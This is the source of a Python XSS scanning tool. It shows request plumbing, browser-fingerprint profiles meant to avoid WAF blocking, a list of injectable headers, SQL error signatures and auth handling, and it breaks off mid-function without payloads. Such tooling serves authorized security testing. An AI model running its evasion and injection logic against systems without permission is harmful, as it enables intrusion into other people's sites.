#!/usr/bin/env python3
"""
xsshunt.py - Cross-Site Scripting test harness.

Covers the main XSS families:
  * Reflected      - payload echoed back in the immediate response (GET params)
  * Path based     - payload injected into URL path segments (404 pages,
                     breadcrumbs, canonical links)
  * Form / POST    - payload submitted through discovered HTML forms
  * Stored         - form input re-fetched from the origin page to spot persistence
  * Header based   - reflection of User-Agent / Referer / X-Forwarded-For / Host ...
  * DOM based      - static source -> sink analysis of inline and external scripts
  * Blind (OOB)    - callback payloads pointing at an out-of-band collector (-b);
                     with --confirm the ones the target echoes back are replayed
                     in the browser, which is what fires them and sends the call

Detection is context aware: a canary probe first tells us where the input lands
(HTML body, tag, attribute, quoted attribute, script string, comment, URL sink)
and which metacharacters survive encoding.  Payloads are then selected for that
context, and a hit is only reported when the characters required to break out
are reflected raw.

Stdlib only - no external dependencies.

For authorized testing only.
"""

from __future__ import annotations

import argparse
import base64
import copy
import concurrent.futures
import http.cookiejar
import json
import os
import queue
import random
import re
import shlex
import socket
import ssl
import string
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field, asdict
from html.parser import HTMLParser

VERSION = "1.13.0"
MAX_BODY = 3 * 1024 * 1024  # don't hold more than 3MB of a response in memory

# A real browser version string is complete: "Chrome/124.0", which this once
# carried, is not a version any browser has ever sent, and WAFs match that
# shape directly - the request is refused before the payload is looked at.
#
# Five mainstream identities, each carrying the headers that browser actually
# sends. They are whole profiles rather than a list of User-Agent strings
# because the rest of the request has to agree with the name on it: only
# Chromium sends sec-ch-ua, Firefox and Safari send none at all, and each has
# its own Accept. A Firefox User-Agent arriving with Chrome's client hints is a
# louder signal than no rotation at all.
CHROME_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                 "image/avif,image/webp,image/apng,*/*;q=0.8,"
                 "application/signed-exchange;v=b3;q=0.7")
FIREFOX_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                  "image/avif,image/webp,*/*;q=0.8")
SAFARI_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                 "*/*;q=0.8")


def _chromium_hints(major: str, platform: str, edge: str = "") -> dict:
    brands = (f'"Chromium";v="{major}", "Microsoft Edge";v="{major}", '
              f'"Not?A_Brand";v="24"' if edge else
              f'"Chromium";v="{major}", "Google Chrome";v="{major}", '
              f'"Not?A_Brand";v="24"')
    return {"sec-ch-ua": brands, "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": f'"{platform}"'}


UA_PROFILES = [
    {"name": "Chrome 141 / Windows",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.7390.66 Safari/537.36",
     "Accept": CHROME_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": _chromium_hints("141", "Windows")},
    {"name": "Chrome 141 / macOS",
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.7390.66 Safari/537.36",
     "Accept": CHROME_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": _chromium_hints("141", "macOS")},
    {"name": "Edge 141 / Windows",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.7390.66 Safari/537.36 Edg/141.0.3537.57",
     "Accept": CHROME_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": _chromium_hints("141", "Windows", edge="1")},
    {"name": "Firefox 143 / Windows",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) "
                   "Gecko/20100101 Firefox/143.0",
     "Accept": FIREFOX_ACCEPT, "Accept-Language": "en-US,en;q=0.5",
     "hints": {}},          # Gecko sends no client hints
    {"name": "Safari 18 / macOS",
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                   "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                   "Version/18.6 Safari/605.1.15",
     "Accept": SAFARI_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": {}},          # WebKit sends no client hints
]

DEFAULT_UA = UA_PROFILES[0]["User-Agent"]

# Sent by every one of the five on a navigation, http and https alike. Their
# absence is a tell in itself, so a request claiming to be a browser carries
# them whichever profile is in use.
FETCH_METADATA = {
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
}

# Headers worth injecting into - frequently reflected by error pages, logs and
# analytics/debug panels
def parse_cookie_header(value: str) -> dict:
    """Split a Cookie header into its individual cookies, order preserved."""
    jar = {}
    for part in (value or "").split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        k, _, v = part.partition("=")
        if k.strip():
            jar[k.strip()] = v.strip()
    return jar


def build_cookie_header(jar: dict) -> str:
    return "; ".join(f"{k}={v}" for k, v in jar.items())


# A name alone is ambiguous once cookies and headers are injection points too:
# "id" can be a query parameter, a form field and a cookie on the same request,
# and picking by name only would test whichever came first. The prefix says
# which one is meant; without it the name still matches anywhere, so the short
# form keeps working.
PARAM_KINDS = {
    "query": "query", "get": "query", "url": "query",
    "body": "body", "post": "body", "data": "body",
    "cookie": "cookie",
    "header": "header",
    # A JSON leaf is addressed by its path: -p json:meta.tags[0]. "body" also
    # reaches it, because a JSON body IS the body, and a bare name matches it
    # like any other -- so -p bio finds meta.bio without the operator having
    # to know the shape of the document.
    "json": "json",
}


@dataclass(frozen=True)
class ParamSpec:
    """One name given to -p, with the place it has to be looked for."""
    kind: str                   # "" = anywhere | query | body | cookie | header
    name: str

    @property
    def key(self) -> str:
        return self.name.lower()

    def matches(self, kind: str, name: str) -> bool:
        if (name or "").lower() != self.key:
            return False
        return not self.kind or self.kind == kind

    def __str__(self) -> str:
        return f"{self.kind}:{self.name}" if self.kind else self.name


def parse_param_specs(raw: str) -> list:
    """Parse -p: "id,cookie:lang,header:User-Agent"."""
    out = []
    for item in (raw or "").split(","):
        item = item.strip()
        if not item:
            continue
        kind = ""
        head, sep, tail = item.partition(":")
        if sep and tail.strip():
            k = PARAM_KINDS.get(head.strip().lower())
            if k:
                kind, item = k, tail.strip()
        out.append(ParamSpec(kind, item))
    return out


INJECTABLE_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
                      "X-Real-IP", "Origin", "X-Requested-With", "X-Api-Version",
                      "True-Client-IP", "Client-IP", "X-Wap-Profile", "From"]

PROBE_CHARS = "<>\"'`;()/{}"

# Input types that never carry a payload anywhere useful
INERT_INPUT_TYPES = frozenset({"submit", "button", "image", "reset", "file"})

# A target must answer with something other than a 3xx/5xx before we spend any
# tests on it.  Transport failures count as a failed attempt too.
PREFLIGHT_TRIES = 3
PREFLIGHT_BACKOFF = 1.0     # seconds, multiplied by the attempt number

# Database error signatures.  XSS payloads carry quotes, so a broken SQL string
# frequently shows up while testing - worth alerting on even though this tool
# does not test for SQL injection itself.
SQL_ERRORS = [
    ("MySQL", re.compile(
        r"SQL syntax.{0,80}?MySQL|Warning.{0,40}?\bmysqli?_|MySqlException|"
        r"valid MySQL result|check the manual that (corresponds|fits) to your "
        r"(MySQL|MariaDB) server version|MySqlClient\.|com\.mysql\.jdbc|"
        r"Unknown column '[^']+' in 'field list'", re.I | re.S)),
    ("PostgreSQL", re.compile(
        r"PostgreSQL.{0,40}?ERROR|Warning.{0,40}?\bpg_|valid PostgreSQL result|"
        r"Npgsql\.|PG::SyntaxError|org\.postgresql\.util\.PSQLException|"
        r"ERROR:\s*syntax error at or near|psycopg2\.\w+Error", re.I | re.S)),
    ("Microsoft SQL Server", re.compile(
        r"Driver.{0,40}?SQL[\-\_\ ]*Server|OLE DB.{0,40}?SQL Server|"
        r"\bSQL Server[^&<\"]{0,40}?Driver|Warning.{0,40}?\bmssql_|"
        r"System\.Data\.SqlClient\.SqlException|"
        r"Unclosed quotation mark after the character string|"
        r"Incorrect syntax near|microsoft SQL native client error", re.I | re.S)),
    ("Oracle", re.compile(
        r"\bORA-\d{5}|Oracle error|Oracle.{0,40}?Driver|Warning.{0,40}?\boci_|"
        r"quoted string not properly terminated", re.I | re.S)),
    ("SQLite", re.compile(
        r"SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite\.SQLiteException|"
        r"Warning.{0,40}?\bsqlite_|\[SQLITE_ERROR\]|SQLite error \d+:|"
        r"sqlite3\.\w*(?:Operational|Programming|Integrity)Error|"
        r"unrecognized token:", re.I | re.S)),
    ("IBM DB2", re.compile(
        r"CLI Driver.{0,40}?DB2|DB2 SQL error|\bdb2_\w+\(|SQLCODE[=:\s-]\s*-?\d+",
        re.I | re.S)),
    ("Sybase", re.compile(
        r"Warning.{0,40}?\bsybase|Sybase message|Sybase.{0,40}?Server message|"
        r"com\.sybase\.jdbc", re.I | re.S)),
    ("MS Access", re.compile(
        r"Microsoft Access (\d+ )?Driver|JET Database Engine|"
        r"Access Database Engine|ODBC Microsoft Access", re.I)),
    ("Informix", re.compile(
        r"Exception.{0,40}?Informix|Informix ODBC Driver|com\.informix\.jdbc",
        re.I | re.S)),
    ("Generic SQL/JDBC", re.compile(
        r"java\.sql\.SQLException|SQLSTATE\[[\w\d]+\]|"
        r"Microsoft OLE DB Provider for ODBC Drivers|"
        r"You have an error in your SQL syntax", re.I)),
]

# Cheap gate before the ten regexes above. Every SQL_ERRORS pattern requires at
# least one of these substrings, so a body containing none of them cannot match
# and does not need to be scanned. Most responses fall out here, which matters:
# those patterns use re.S with bounded wildcards and are slow over a 3MB body.
SQL_HINTS = ("sql", "ora-", "oracle", "sqlite", "db2", "sybase", "odbc", "jdbc",
             "postgres", "mysql", "mariadb", "npgsql", "psycopg", "informix",
             "jet database", "microsoft access", "sqlstate", "sqlcode")


# ----------------------------------------------------------------------------
# Colour
# ----------------------------------------------------------------------------

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GREY = "\033[90m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

    _ATTRS = ("RED", "GREEN", "YELLOW", "BLUE", "MAGENTA", "CYAN", "GREY",
              "BOLD", "RESET")

    @classmethod
    def disable(cls):
        for attr in cls._ATTRS:
            setattr(cls, attr, "")


# ----------------------------------------------------------------------------
# Status heartbeat
# ----------------------------------------------------------------------------

class Status:
    """
    Periodic status heartbeat for list mode (-l).

    Emitted on a timer from a daemon thread, so it fires at a steady wall-clock
    interval regardless of verbosity and regardless of how long any one host
    takes. Prints whole lines rather than redrawing in place: at -v 1 the output
    scrolls constantly, so an in-place indicator would be unreadable.

    Not used for a single target (-u) -- one host needs no queue accounting.
    """

    def __init__(self, reporter, total, interval=30.0, enabled=True):
        self.rep = reporter
        self.total = total
        self.interval = interval
        self.enabled = enabled
        self.done = 0
        self.counts = {"confirmed": 0, "alert": 0, "potential": 0,
                       "planted": 0, "oob": 0}
        self._lk = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._t0 = 0.0

    def start(self):
        if not self.enabled:
            return
        self._t0 = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        # wait() returns True only when stop() is set, so a normal timeout emits
        while not self._stop.wait(self.interval):
            self.emit()

    def host_done(self, n=1):
        with self._lk:
            self.done += n

    def record(self, confidence):
        with self._lk:
            if confidence in self.counts:
                self.counts[confidence] += 1

    def emit(self, label="status"):
        if not self.enabled:
            return
        with self._lk:
            done, c = self.done, dict(self.counts)
        remaining = max(0, self.total - done)
        el = int(time.time() - self._t0)
        cl = Colors
        self.rep.line(
            f"{cl.CYAN}  [{label} {el // 60:02d}:{el % 60:02d}]  "
            f"tested {done}/{self.total}  remaining {remaining}  |  "
            f"confirmed {c['confirmed']}  oob {c['oob']}  sql {c['alert']}  "
            f"potential {c['potential']}  planted {c['planted']}{cl.RESET}")

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=1)


# ----------------------------------------------------------------------------
# Output
# ----------------------------------------------------------------------------

class Reporter:
    """Verbosity-aware, thread-safe console reporter."""

    def __init__(self, level: int = 0):
        self.level = level
        self.lock = threading.Lock()

    def _emit(self, text: str):
        with self.lock:
            sys.stdout.write(text + "\n")
            sys.stdout.flush()

    def line(self, text: str):
        """One whole line, printed atomically - used by the Status heartbeat."""
        self._emit(text)

    def hit(self, finding: "Finding"):
        """Always shown, at every verbosity level."""
        c = Colors
        badge = (f" {c.CYAN}{c.BOLD}[CONFIRMED]{c.RESET}" if finding.verified else "")
        lines = [
            "",
            f"{c.GREEN}{c.BOLD}[VULNERABLE]{c.RESET}{badge} {c.BOLD}{finding.kind}{c.RESET}",
            f"  {c.CYAN}URL      :{c.RESET} {finding.url}",
            f"  {c.CYAN}Method   :{c.RESET} {finding.method}",
            f"  {c.CYAN}Parameter:{c.RESET} {finding.param} ({finding.location})",
            f"  {c.CYAN}Context  :{c.RESET} {finding.context}",
            f"  {c.CYAN}Payload  :{c.RESET} {c.YELLOW}{finding.payload}{c.RESET}",
        ]
        if finding.verified:
            lines.append(f"  {c.CYAN}Verified :{c.RESET} "
                         f"{c.RED}confirmed through headless browser "
                         f"({finding.verified_note or 'alert déclenchée'})"
                         f"{c.RESET}")
        elif finding.unconfirmed:
            lines.append(f"  {c.CYAN}Verified :{c.RESET} "
                         f"{c.YELLOW}not attempted - {finding.unconfirmed}"
                         f"{c.RESET}")
        if finding.evidence:
            lines.append(f"  {c.CYAN}Evidence :{c.RESET} {finding.evidence}")
        if finding.poc:
            lines.append(f"  {c.CYAN}PoC      :{c.RESET} {finding.poc}")
        self._emit("\n".join(lines))

    def alert(self, finding: "Finding"):
        """Loud, always-shown alert - a database error leaked into the response."""
        c = Colors
        bar = "!" * 62
        lines = [
            "",
            f"{c.RED}{c.BOLD}{bar}{c.RESET}",
            f"{c.RED}{c.BOLD}[SQL ERROR ALERT]{c.RESET} {c.BOLD}{finding.kind}{c.RESET}",
            f"  {c.CYAN}URL      :{c.RESET} {finding.url}",
            f"  {c.CYAN}Method   :{c.RESET} {finding.method}",
            f"  {c.CYAN}Parameter:{c.RESET} {finding.param} ({finding.location})",
            f"  {c.CYAN}Payload  :{c.RESET} {finding.payload}",
            f"  {c.CYAN}Error    :{c.RESET} {c.RED}{finding.evidence}{c.RESET}",
        ]
        if finding.context:
            lines.append(f"  {c.CYAN}Note     :{c.RESET} {finding.context}")
        if finding.poc:
            lines.append(f"  {c.CYAN}PoC      :{c.RESET} {finding.poc}")
        lines.append(f"{c.RED}{c.BOLD}{bar}{c.RESET}")
        self._emit("\n".join(lines))

    def oob(self, finding: "Finding"):
        """
        A callback seen in the user's OWN collector log - the loudest result
        this tool produces, and the only one nothing local could fake. The
        browser that fired the payload was not ours, and the hostname exists
        nowhere else, so reflection, CSP and our replay are all beside the
        point: it ran, somewhere, in someone's session.
        """
        c = Colors
        bar = "=" * 62
        lines = [
            "",
            f"{c.MAGENTA}{c.BOLD}{bar}{c.RESET}",
            f"{c.MAGENTA}{c.BOLD}[OOB CALLBACK]{c.RESET} "
            f"{c.MAGENTA}{c.BOLD}{finding.kind}{c.RESET}",
            f"  {c.CYAN}Host     :{c.RESET} {c.MAGENTA}{finding.context}{c.RESET}",
            f"  {c.CYAN}URL      :{c.RESET} {finding.url}",
            f"  {c.CYAN}Method   :{c.RESET} {finding.method}",
            f"  {c.CYAN}Parameter:{c.RESET} {finding.param} ({finding.location})",
        ]
        if finding.payload:
            lines.append(f"  {c.CYAN}Payload  :{c.RESET} "
                         f"{c.YELLOW}{finding.payload}{c.RESET}")
        if finding.evidence:
            lines.append(f"  {c.CYAN}Log line :{c.RESET} {finding.evidence}")
        if finding.poc:
            lines.append(f"  {c.CYAN}PoC      :{c.RESET} {finding.poc}")
        lines.append(f"{c.MAGENTA}{c.BOLD}{bar}{c.RESET}")
        self._emit("\n".join(lines))

    def maybe(self, finding: "Finding"):
        """Potential issue needing manual confirmation (DOM, blind, stored)."""
        c = Colors
        badge = (f" {c.CYAN}{c.BOLD}[CONFIRMED]{c.RESET}" if finding.verified else "")
        head = (f"{c.GREEN}{c.BOLD}[VULNERABLE]{c.RESET}{badge}" if finding.verified
                else f"{c.YELLOW}{c.BOLD}[POTENTIAL]{c.RESET}")
        lines = [
            "",
            f"{head} {c.BOLD}{finding.kind}{c.RESET}",
            f"  {c.CYAN}URL      :{c.RESET} {finding.url}",
            f"  {c.CYAN}Parameter:{c.RESET} {finding.param} ({finding.location})",
            f"  {c.CYAN}Context  :{c.RESET} {finding.context}",
        ]
        if finding.verified:
            lines.append(f"  {c.CYAN}Verified :{c.RESET} "
                         f"{c.RED}confirmed through headless browser"
                         f"{' (' + finding.verified_note + ')' if finding.verified_note else ''}"
                         f"{c.RESET}")
        if finding.payload:
            lines.append(f"  {c.CYAN}Payload  :{c.RESET} {finding.payload}")
        if finding.evidence:
            lines.append(f"  {c.CYAN}Evidence :{c.RESET} {finding.evidence}")
        self._emit("\n".join(lines))

    def test(self, msg: str):
        """Individual test trace - verbosity 1+."""
        if self.level >= 1:
            self._emit(f"{Colors.GREY}[test]{Colors.RESET} {msg}")

    def info(self, msg: str):
        if self.level >= 1:
            self._emit(f"{Colors.BLUE}[info]{Colors.RESET} {msg}")

    def debug(self, msg: str):
        if self.level >= 2:
            self._emit(f"{Colors.MAGENTA}[dbg ]{Colors.RESET} {msg}")

    def warn(self, msg: str):
        """Always shown, for the same reason auth() is.

        Gated at -v 1 this was not a warning, it was a note: at the default
        verbosity a skipped multipart form, an auth file line that would not
        parse, a -p matching nothing and "blind XSS requested but every vector
        is disabled" were all indistinguishable from a clean scan. Every one
        of them changes what the run means, and the operator who most needs
        to read them is the one who did not ask for verbosity.
        """
        self._emit(f"{Colors.YELLOW}[warn]{Colors.RESET} {msg}")

    def auth(self, msg: str):
        """Always shown - a scan that silently runs unauthenticated looks
        exactly like one that found nothing."""
        self._emit(f"{Colors.BLUE}[auth]{Colors.RESET} {msg}")

    def skip(self, msg: str):
        """Always shown - the user needs to know a target went untested."""
        self._emit(f"{Colors.YELLOW}{Colors.BOLD}[skip]{Colors.RESET} {msg}")

    def error(self, msg: str):
        self._emit(f"{Colors.RED}[err ]{Colors.RESET} {msg}")

    def banner(self, msg: str):
        if self.level >= 1:
            self._emit(f"\n{Colors.BOLD}{Colors.BLUE}=== {msg} ==={Colors.RESET}")


# ----------------------------------------------------------------------------
# Data model
# ----------------------------------------------------------------------------

@dataclass
class Finding:
    kind: str                 # Reflected XSS, DOM XSS, ...
    url: str
    param: str
    location: str = "query"   # query / body / header / fragment / path
    method: str = "GET"
    context: str = ""
    payload: str = ""
    evidence: str = ""
    poc: str = ""
    confidence: str = "confirmed"   # confirmed | potential | planted | alert
    verified: bool = False          # execution proven by the headless browser
    verified_note: str = ""         # how it was proven (dialog / OOB callback)
    # Blind only: one entry per planted payload, carrying everything needed to
    # replay it in the browser.  See Scanner._plant() / Confirmer.verify_blind().
    plants: list = field(default_factory=list, repr=False)
    # POST only: the body as it was sent, so --confirm can reproduce it with a
    # self-submitting form. A POST has no navigable URL, which is why these
    # findings used to be reported and then never verified. Kept out of the
    # JSON report -- it can carry a file's bytes.
    submit: dict | None = field(default=None, repr=False)
    # With --confirm: why the browser could not be given this one to run.
    # Empty means it ran it and nothing fired, which is a different fact.
    unconfirmed: str = ""


@dataclass
class Response:
    url: str
    status: int
    headers: dict
    body: str
    elapsed: float = 0.0
    error: str = ""

    def __post_init__(self):
        # Normalised once here rather than scanning on every header() call.
        self._lower = {k.lower(): v for k, v in self.headers.items()}
        self._doc: "Doc | None" = None

    @property
    def ok(self) -> bool:
        return not self.error

    def header(self, name: str, default: str = "") -> str:
        return self._lower.get(name.lower(), default)

    @property
    def doc(self) -> "Doc":
        """
        Lazily built, cached view of the body used by context analysis and the
        SQL scan. Building it lowercases the body once per response instead of
        once per reflection.
        """
        if self._doc is None:
            self._doc = Doc(self.body)
        return self._doc


@dataclass
class Form:
    action: str
    method: str = "GET"
    enctype: str = "application/x-www-form-urlencoded"
    inputs: dict = field(default_factory=dict)   # name -> default value
    types: dict = field(default_factory=dict)    # name -> input type
    # A captured multipart body: the real parts, bytes, filenames and per-part
    # types intact. Rebuilding them from inputs/types would throw away exactly
    # what makes the capture worth replaying.
    raw_parts: tuple | None = None
    boundary: str | None = None     # celui de la capture, conservé tel quel

    @property
    def is_multipart(self) -> bool:
        """POST only: a browser ignores enctype on a GET form and sends a
        query string, so honouring it there would send a request no browser
        would ever produce."""
        return ("multipart" in (self.enctype or "").lower()
                and (self.method or "").upper() == "POST")

    def field_values(self) -> dict:
        """Every field with a usable value, defaults filled in."""
        return {k: (v or "test") for k, v in self.inputs.items()}

    def parts(self) -> list:
        """The multipart parts this form submits."""
        if self.raw_parts is not None:
            return list(self.raw_parts)
        out = []
        for n, v in self.inputs.items():
            if (self.types.get(n) or "").lower() == "file":
                out.append(Part(n, *DEFAULT_UPLOAD))
            else:
                out.append(Part(n, v or "test"))
        return out

    def injectable(self) -> list[str]:
        """Field names worth injecting into, falling back to all of them."""
        names = [n for n, t in self.types.items() if t not in INERT_INPUT_TYPES]
        return names or list(self.inputs.keys())

    def file_names(self) -> list[str]:
        """Parts that carry a filename.

        Only what the request already has: a part with no filename does not
        grow one, because adding it turns an ordinary field into a file upload
        and the request stops being the one under test.
        """
        if not self.is_multipart:
            return []
        return [p.name for p in self.parts() if p.filename is not None]

    def selectable(self) -> list[str]:
        """Every field name -p can name, file parts included: a file input is
        not injectable by value and would otherwise be unreachable."""
        return list(dict.fromkeys(self.injectable() + self.file_names()))

    def resolved(self, page_url: str) -> tuple[str, str]:
        """(absolute action URL, usable method)."""
        action = urllib.parse.urljoin(page_url, self.action or page_url)
        method = self.method if self.method in ("GET", "POST") else "GET"
        return action, method


# ----------------------------------------------------------------------------
# HTTP layer
# ----------------------------------------------------------------------------

class AuthStore:
    """
    Per-host authentication headers, loaded once and consulted per request.

    Most of an application's surface sits behind a login, and until now the
    only way in was -H, which feeds ONE header dict shared by every target: in
    -l mode a session cookie given that way is sent to every host in the list,
    including third parties. Here the headers are keyed by (host, port) and
    resolved at request time, so they reach the host they belong to and no
    other.

    Files are named after the host they authenticate:

        www.example.com.txt        every port of that host
        www.example.com_8080.txt   that port only, and it wins over the above

    No implicit subdomain inheritance: a file for example.com does NOT
    authenticate app.example.com. Credentials that follow a wildcard end up on
    whatever subdomain happens to resolve, including one that has been taken
    over -- which is the sort of thing this suite exists to find.

    Content is the -H syntax, one header per line; '#' and blank lines are
    ignored and a line without a colon is reported rather than dropped in
    silence. Nothing here is limited to Cookie and Authorization: an Origin, an
    X-Api-Key or a tenant header belongs just as well.
    """

    def __init__(self):
        self.forced: dict = {}          # --auth-file: applies to every target
        self.by_key: dict = {}          # (host, port|None) -> headers
        self.loaded: list = []          # (path, scope) for the -v 1 listing

    # -- loading

    @staticmethod
    def _parse(path: str, report) -> dict:
        out = {}
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for n, line in enumerate(fh, 1):
                line = line.strip().lstrip("\ufeff")
                if not line or line.startswith("#"):
                    continue
                if ":" not in line:
                    report.warn(f"{os.path.basename(path)}:{n}: no ':' — "
                                f"line ignored: {line[:60]}")
                    continue
                k, _, v = line.partition(":")
                if k.strip():
                    out[k.strip()] = v.strip()
        return out

    @staticmethod
    def _key_from_name(name: str):
        """www.example.com_8080.txt -> ('www.example.com', 8080)."""
        stem = name[:-4] if name.lower().endswith(".txt") else name
        host, sep, tail = stem.rpartition("_")
        if sep and host and tail.isdigit():
            return host.lower(), int(tail)
        return stem.lower(), None

    @classmethod
    def load(cls, auth_file: str | None, auth_dir: str | None, report):
        st = cls()
        if auth_file:
            if not os.path.isfile(auth_file):
                raise ValueError(f"no such auth file: {auth_file}")
            st.forced = cls._parse(auth_file, report)
            st.loaded.append((auth_file, "every target"))
        elif auth_dir:
            if not os.path.isdir(auth_dir):
                raise ValueError(f"no such auth directory: {auth_dir}")
            for name in sorted(os.listdir(auth_dir)):
                if name.startswith(".") or not name.lower().endswith(".txt"):
                    continue
                path = os.path.join(auth_dir, name)
                if not os.path.isfile(path):
                    continue
                host, port = cls._key_from_name(name)
                st.by_key[(host, port)] = cls._parse(path, report)
                st.loaded.append(
                    (path, host if port is None else f"{host}:{port}"))
        return st

    def __bool__(self):
        return bool(self.forced or self.by_key)

    def describe(self, report):
        n = len(self.loaded)
        if not n:
            return
        report.auth(f"{n} auth file(s) loaded")
        for path, scope in self.loaded:
            report.info(f"  auth {os.path.basename(path)} -> {scope}")

    # -- resolution

    @staticmethod
    def _key(url: str):
        parts = urllib.parse.urlsplit(url)
        host = (parts.hostname or "").lower()
        port = parts.port or (443 if parts.scheme == "https" else 80)
        return host, port

    def headers_for(self, url: str) -> dict:
        """The auth headers this URL gets, port-specific file winning."""
        if self.forced:
            return self.forced
        host, port = self._key(url)
        return self.by_key.get((host, port)) or self.by_key.get((host, None)) or {}

    def names_for(self, url: str) -> set:
        return {k.lower() for k in self.headers_for(url)}

    def cookies_for(self, url: str) -> set:
        """Cookie names supplied as credentials — never injected by default."""
        out = set()
        for k, v in self.headers_for(url).items():
            if k.lower() == "cookie":
                out |= set(parse_cookie_header(v))
        return out


class AuthRedirect(urllib.request.HTTPRedirectHandler):
    """
    Re-resolve the auth headers when a redirect crosses to another host.

    urllib copies the original headers onto the redirected request, so without
    this the session would simply follow a 302 to whatever host the target
    names -- the exact leak the per-host table exists to prevent.
    """

    def __init__(self, store: "AuthStore"):
        super().__init__()
        self.store = store

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        new = super().redirect_request(req, fp, code, msg, headers, newurl)
        if new is None or not self.store:
            return new
        if urllib.parse.urlsplit(req.full_url).netloc.lower() == \
                urllib.parse.urlsplit(newurl).netloc.lower():
            return new
        drop = self.store.names_for(req.full_url)
        for name in list(new.headers):
            if name.lower() in drop:
                del new.headers[name]
        for k, v in self.store.headers_for(newurl).items():
            new.add_header(k, v)
        return new


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


class Requester:
    """
    HTTP client.

    Each thread gets its own opener and cookie jar. urllib's opener is not
    documented as thread-safe, and a jar shared across threads would let cookies
    set while scanning one host travel to another.

    --delay is enforced as a global minimum gap between requests rather than a
    per-thread sleep, so the requested rate holds no matter how many threads run.
    """

    @staticmethod
    def _as_dict(headers) -> dict:
        out = {}
        for h in headers or []:
            if ":" in h:
                k, _, v = h.partition(":")
                if k.strip():
                    out[k.strip()] = v.strip()
        return out

    def __init__(self, timeout=10.0, proxy=None, headers=None, delay=0.0,
                 follow_redirects=True, reporter=None,
                 req_headers=None, auth=None):
        self.timeout = timeout
        self.reporter = reporter
        self.proxy = proxy
        self.follow_redirects = follow_redirects
        self.auth = auth
        # Three sources, lowest priority first: what the captured request
        # carried, what the auth file says for this host, and -H. The first is
        # still overridden by the per-host browser profile, as it always was;
        # the other two are not.
        self.req_headers = self._as_dict(req_headers)
        self.cli_headers = self._as_dict(headers)
        self.base_headers = {**FETCH_METADATA, "Connection": "close"}
        self.base_headers.update(self._profile_headers(UA_PROFILES[0]))
        self.base_headers.update(self.req_headers)
        self.base_headers.update(self.cli_headers)
        self._explicit = {k.lower() for k in self.cli_headers}

        # Identity rotates per TARGET HOST, never per request: one client that
        # changes browser between two requests of the same session is a louder
        # signal than any single fixed User-Agent, and its cookies would follow
        # it across the change. Each host sees one coherent browser; the next
        # host sees a different one. The starting point is random so two runs
        # over the same list do not line up.
        self._profiles = list(UA_PROFILES)
        self._rotation = random.randrange(len(self._profiles))
        self._by_host: dict[str, dict] = {}
        self._host_lock = threading.Lock()

        self._min_gap = max(0.0, delay)
        self._next_slot = 0.0
        self._rate_lock = threading.Lock()
        self._count_lock = threading.Lock()
        self._local = threading.local()
        self.count = 0

    def _build_opener(self):
        # certificates are not verified: targets routinely use self-signed or
        # expired certs, and traffic is often routed through an intercepting proxy
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        handlers = [urllib.request.HTTPSHandler(context=ctx),
                    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())]
        if self.proxy:
            handlers.append(urllib.request.ProxyHandler(
                {"http": self.proxy, "https": self.proxy}))
        if not self.follow_redirects:
            handlers.append(NoRedirect())
        elif self.auth:
            handlers.append(AuthRedirect(self.auth))
        return urllib.request.build_opener(*handlers)

    def _opener(self):
        op = getattr(self._local, "opener", None)
        if op is None:
            op = self._build_opener()
            self._local.opener = op
        return op

    def _throttle(self):
        """Reserve the next slot, then sleep outside the lock."""
        if self._min_gap <= 0:
            return
        with self._rate_lock:
            now = time.monotonic()
            wait = max(0.0, self._next_slot - now)
            self._next_slot = max(now, self._next_slot) + self._min_gap
        if wait:
            time.sleep(wait)

    @staticmethod
    def _encode_body(data):
        """(bytes, content type, is the content type authoritative).

        Authoritative means: overwrite a Content-Type replayed from a capture
        instead of deferring to it. Only multipart needs that, and it needs it
        absolutely -- the header names the boundary that frames the body we
        just built, so a stale one from the capture describes a body that no
        longer exists. Everywhere else the captured header is the better one:
        it keeps the charset, and vendor types like application/vnd.api+json
        are what the application dispatches on.
        """
        if data is None:
            return None, None, False
        if isinstance(data, MultipartBody):
            return data.encode(), data.content_type, True
        if isinstance(data, JsonBody):
            # The content type is part of the test: an application that reads
            # JSON reads it because this header says so, and a body sent
            # without it is parsed as nothing at all.
            return data.text.encode(), "application/json", False
